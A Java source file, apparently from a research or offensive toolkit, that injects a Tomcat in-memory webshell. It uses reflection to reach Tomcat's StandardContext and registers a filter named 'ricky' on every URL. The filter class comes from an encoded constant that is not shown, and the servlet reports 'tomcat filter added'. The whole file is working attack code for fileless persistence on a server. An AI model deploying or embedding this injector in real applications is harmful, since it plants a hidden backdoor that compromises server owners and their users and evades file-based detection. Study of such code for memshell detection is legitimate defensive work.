package com.tomcat.memshell.Filter;

import com.tomcat.util.ClassUtil;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class MemFilter extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String filterName = "ricky";
        // 从request中获取 servletContext
        try {
//            ServletContext servletContext = req.getServletContext();
            ServletContext servletContext = req.getSession().getServletContext();

            if (servletContext.getFilterRegistration(filterName) == null) {
                // 1.循环判断获取Tomcat StandardContext对象
//                StandardContext o = null;
//                while (o == null) {
//                    Field f = servletContext.getClass().getDeclaredField("context");
//                    f.setAccessible(true);
//                    Object obj = f.get(servletContext);
//
//                    if (obj instanceof ServletContext) {
//                        servletContext = ((ServletContext) obj);
//                    } else if (obj instanceof StandardContext){
//                        o = (StandardContext) obj;
//                    }
//                }
                // 2.ApplicationContextFacade->ApplicationContext->StandardContext
                Field servletfield = servletContext.getClass().getDeclaredField("context");
                servletfield.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) servletfield.get(servletContext);
                Field applicationfield = applicationContext.getClass().getDeclaredField("context");
                applicationfield.setAccessible(true);
                StandardContext o = (StandardContext) applicationfield.get(applicationContext);

                // 创建自定义的Filter对象
                Class<?> filterClass = ClassUtil.getClass(ClassUtil.FILTER_STRING);

                // 创建FilterDef
                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName(filterName);
                filterDef.setFilter((Filter)filterClass.newInstance());
                filterDef.setFilterClass(filterClass.getName());

                // 创建ApplicationFilterConfig
                Constructor<?>[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();
                constructor[0].setAccessible(true);
                ApplicationFilterConfig config = (ApplicationFilterConfig) constructor[0].newInstance(o, filterDef);

                // 创建FilterMap
                FilterMap filterMap = new FilterMap();
                filterMap.setFilterName(filterName);
                filterMap.addURLPattern("*");
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                // 反射将ApplicationFilterConfig放入StandardContext中的filterConfigs中
                Field configfield = o.getClass().getDeclaredField("filterConfigs");
                configfield.setAccessible(true);
                // 直接赋值会把别的服务给覆盖掉, 取出再赋值
                HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) configfield.get(o);
                filterConfigs.put(filterName, config);

                // 可以不用反射直接调用ContextFilterMaps#addBefore但是FilterDef必须能找到
                o.addFilterDef(filterDef);
                o.addFilterMapBefore(filterMap);

                // 反射将FilterMap放入StandardContext中的FilterMaps中
//                Field mapfield = o.getClass().getDeclaredField("filterMaps");
//                mapfield.setAccessible(true);

//                Object object = mapfield.get(o);
//                Class cl = Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
//                Method m = cl.getDeclaredMethod("addBefore", FilterMap.class);
//                m.setAccessible(true);
//                m.invoke(object, filterMap);

                resp.getOutputStream().write("tomcat filter added".getBytes());
                resp.getOutputStream().flush();
                resp.getOutputStream().close();
//                PrintWriter writer = resp.getWriter();
//                writer.println("tomcat filter added");
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}